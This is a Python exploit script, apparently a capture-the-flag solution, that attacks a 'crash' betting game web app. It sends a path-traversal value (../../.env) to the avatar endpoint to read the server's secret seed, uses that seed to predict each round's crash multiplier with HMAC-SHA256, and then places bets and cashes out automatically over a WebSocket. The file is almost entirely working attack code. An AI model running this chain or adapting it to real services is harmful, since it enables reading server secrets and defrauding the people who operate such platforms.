import hmac, hashlib, math, json, websocket, requests, sys

# --- CONFIGURATION ---
URL = ""
USERNAME = ""
PASSWORD = ""
# ---------------------

WS_URL = f"{URL.replace('http', 'ws')}/ws/game"
G, R, B, C, Y, W = '\033[32m', '\033[31m', '\033[34m', '\033[36m', '\033[33m', '\033[0m'

# PHASE 1: AUTHENTICATION
# Establishing a valid session to obtain the token required for LFI access.
print(f"{B}[*] AUTHENTICATING...{W}")
res = requests.post(f"{URL}/login", json={"username": USERNAME, "password": PASSWORD})
if res.status_code != 200:
    res = requests.post(f"{URL}/register", json={"username": USERNAME, "password": PASSWORD})

auth = res.json()
token, balance = auth["user"]["token"], auth["user"]["balance"]


# PHASE 2: LFI SEED EXTRACTION
# Exploiting path traversal in the avatar endpoint to read the .env file.
print(f"{B}[*] EXTRACTING SEED...{W}")
lfi_url = f"{URL}/api/avatar?file=../../.env&token={token}"
lfi_res = requests.get(lfi_url).text
if "SERVER_SEED" not in lfi_res:
    print(f"{R}[!] LFI FAILED{W}"); sys.exit()

seed = [l.split("=")[1] for l in lfi_res.split("\n") if "SERVER_SEED" in l][0].strip()
print(f"{G}[+] SEED SECURED: {seed[:12]}...{W}")


# PHASE 3: CRYPTOGRAPHIC PREDICTION
# Uses the leaked SERVER_SEED and the public round_id to reconstruct 
# the HMAC-SHA256 hash and calculate the exact crash multiplier.
def get_crash(seed, round_id):
    hex_hash = hmac.new(seed.encode(), str(round_id).encode(), hashlib.sha256).hexdigest()
    if int(hex_hash, 16) % 33 == 0: return 1.00
    h, e = int(hex_hash[:13], 16), 2**52
    return math.floor((100 * e - h) / (e - h)) / 100.0

    
# PHASE 4: AUTOMATED EXECUTION
# Real-time WebSocket interaction to place bets and cash out before the crash.
target_exit, last_id = 0, None

def on_message(ws, msg):
    global balance, target_exit, last_id
    data = json.loads(msg)
    
    if data.get("type") == "balance_update":
        balance = data["balance"]
        return

    status = data.get("status")

    if status == "WAITING":
        rid = data["round"]["id"]
        if rid != last_id:
            last_id = rid
            pred = get_crash(seed, rid)
            print(f"\n{C}ROUND {rid} | PREDICT: {pred}x{W}")
            
            if pred > 1.15:
                bet = max(10, min(8000, balance * 0.75))
                target_exit = pred - 0.05
                ws.send(json.dumps({"action": "place_bet", "token": token, "amount": bet}))
                print(f"{Y}ACTION: BET {bet:.2f} | EXIT {target_exit:.2f}x{W}")
            else:
                print(f"{R}ACTION: SKIP{W}")
                target_exit = 0

    elif status == "FLYING" and target_exit > 0:
        if data.get("currentMultiplier", 1.0) >= target_exit:
            ws.send(json.dumps({"action": "cashout", "token": token}))
            print(f"{G}[+] CASHOUT SENT{W}")
            target_exit = 0

    elif status == "CRASHED":
        res = data.get("round", {}).get("result", 0)
        print(f"CRASH: {res}x | BAL: {G}{balance:.2f}{W}")

def on_open(ws):
    print(f"{G}[+] MONITORING ACTIVE{W}")

ws = websocket.WebSocketApp(WS_URL, on_message=on_message, on_open=on_open)
ws.run_forever()
